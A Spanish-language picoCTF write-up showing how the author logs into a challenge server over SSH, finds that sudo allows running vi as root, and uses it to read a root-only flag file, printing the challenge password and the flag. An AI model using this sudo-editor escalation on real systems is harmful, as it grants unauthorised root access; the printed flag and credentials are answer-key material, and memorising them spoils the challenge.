# **Descripción**

Can you read files in the root file?The system admin has provisioned an account for you on the main server:`ssh -p 62869 picoplayer@saturn.picoctf.net`Password: `j4ks-9nxB-`Can you login and read the root file?
# **Solución**

Lo primero fue conectarse mediante **SSH** al enlace dado en la descripción mediante el usuario picoplayer y el puerto 62869.

Ya que tratemos de ingresar, digitaremos yes para crear las llaves ssh y posteriormente la contraseña también dada en la descripción.

```
OG922-picoctf@webshell:~$ ssh -p 62869 picoplayer@saturn.picoctf.net
The authenticity of host '[saturn.picoctf.net]:62869 ([13.59.203.175]:62869)' can't be established.
ED25519 key fingerprint is SHA256:HKm/Bw1C+mhj23vO8tXULrgLFYvzP6gQH2IwgUiQTok.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:7: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[saturn.picoctf.net]:62869' (ED25519) to the list of known hosts.
picoplayer@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 6.5.0-1023-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.
```

Una ves dentro del shell verificamos que permisos tenemos con el comando: **sudo -l -U picoplayer** 

```
picoplayer@challenge:~$ sudo -l -U picoplayer
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
```


Al ver que tenemos permisos en **vi**, sabemos que el usuario **picoplayer** tiene permiso para ejecutar el comando **/usr/bin/vi** con privilegios elevados usando **sudo**.

**(ALL)** significa que puede ejecutar **vi** comocualquier usuario, incluido **root**, por tanto ejecutamos el comando **sudo vi /root** para abrir el directorio **/root** con el editor de texto **vi**.

```
" ============================================================================
" Netrw Directory Listing                                        (netrw v165)
"   /root
"   Sorted by      name
"   Sort sequence: [\/]$,\<core\%(\.\d\+\)\=\>,\.h$,\.c$,\.cpp$,\~\=\*$,*,\.o$,\.obj$,\.info$,\.swp$,\.bak$,\~$
"   Quick Help: <F1>:help  -:go up dir  D:delete  R:rename  s:sort-by  x:special
" ==============================================================================
../                                                                                                                            
./
.vim/
.bashrc
.flag.txt
.profile
```

Observamos que contiene un archivo llamado **flag.txt** donde puede encontrarse la bandera, por tanto mostraremos este archivo mediante **vi**.

```
picoplayer@challenge:~$ sudo vi /root/.flag.txt
```

Mostrándonos así la bandera.

```
picoCTF{uS1ng_v1m_3dit0r_021d10ab}
```
# **Notas adicionales**

# **Referencias**